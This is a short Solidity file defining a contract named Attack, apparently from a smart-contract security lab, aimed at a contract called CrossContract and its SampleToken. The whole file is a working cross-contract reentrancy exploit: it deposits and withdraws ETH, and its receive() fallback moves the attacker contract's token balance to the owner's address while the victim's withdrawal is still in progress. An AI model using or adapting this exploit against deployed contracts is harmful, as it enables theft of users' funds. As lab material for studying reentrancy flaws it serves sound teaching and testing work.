// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.18;

import {CrossContract} from "./CrossContract.sol";
import {SampleToken} from "./SampleToken.sol";


contract Attack {
    CrossContract crossContract;
    SampleToken sampleToken;

    address owner;

    constructor(CrossContract _crossContract, address _owner) {
        crossContract = _crossContract;
        owner = _owner;

        sampleToken = crossContract.getToken();
    }

    function deposit() payable external {
        crossContract.deposit{value: msg.value}();
    }

    function withdraw(uint256 _amount) external {
        crossContract.withdraw(_amount);
    }

    receive() payable external {
        uint256 balance = sampleToken.balanceOf(address(this));
        sampleToken.transfer(owner, balance);
     }

}